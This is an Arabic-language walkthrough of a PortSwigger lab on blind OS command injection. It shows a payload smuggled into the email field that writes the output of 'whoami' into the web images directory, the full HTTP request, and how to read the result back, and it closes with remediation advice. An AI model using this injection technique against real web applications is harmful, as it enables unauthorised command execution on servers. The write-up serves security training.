# [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

## **`الهدف`**
قم بتنفيذ الأمر `whoami` واسترجع المخرجات.
## **`خطوات الحل`**
سنقوم بالضغط على `Submit feedback` ثم نقوم بوضع أى بيانات عشوائية وإرسال الطلب، ثم تحويله من داخل `HTTP history` إلى `Repeater`

ثم سنقوم بتعديل قيمة حقل `email` من داخل `Inspector` إلى
```Shell
test||whoami > /var/www/images/test.txt||
```

ثم سنقوم بإرسال الطلب
```http
POST /feedback/submit HTTP/2
Host: 0ab0001d03d2d36c8024b76500c200e7.web-security-academy.net
Cookie: session=U0uG3wcAdA1GZSDD1Rwe5VGY1qhk1ez1

csrf=lHzntVDUOj9E5ELL5AbLIIVl5D7ESbcJ&name=test&email=test%7c%7cwhoami%20%3e%20%2fvar%2fwww%2fimages%2ftest.txt%7c%7c&subject=test&message=test
```

بعد ذلك سنقوم بالتوجه إلى الاب وفتح أى صورة وسنجد أن المسار الخاص بها هو
```URL
https://0ab0001d03d2d36c8024b76500c200e7.web-security-academy.net/image?filename=45.jpg
```

فسنقوم بتعديله إلى
```URL
https://0ab0001d03d2d36c8024b76500c200e7.web-security-academy.net/image?filename=test.txt
```

وسنجد محتويات أمر `whoami` ظاهرة لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Blind OS command injection with time delays](./Blind-OS-command-injection-with-time-delays.md)

ويجب ألا يكون مجلد مثل `/var/www/images/` قابلًا للكتابة بواسطة مستخدم سيرفر الويب (`www-data`) إلا إذا كانت هناك ميزة فعلية لرفع الصور، وحتى إذا كانت ميزة الرفع موجودة، يجب أن تكون الصلاحيات مقيدة جدًا لمنع المهاجم من كتابة ملفات عشوائية سواء نصوص `txt` أو ملفات خبيثة مثل `Web Shells`، ويُنصح بتغيير اسماء الملفات المرفوعة إلى أسماء عشوائية لا يُمكن تخمينها وبالتالي حتى ولو نجح المهاجم في رفع الملف فلن يستطيع استدعاءه.
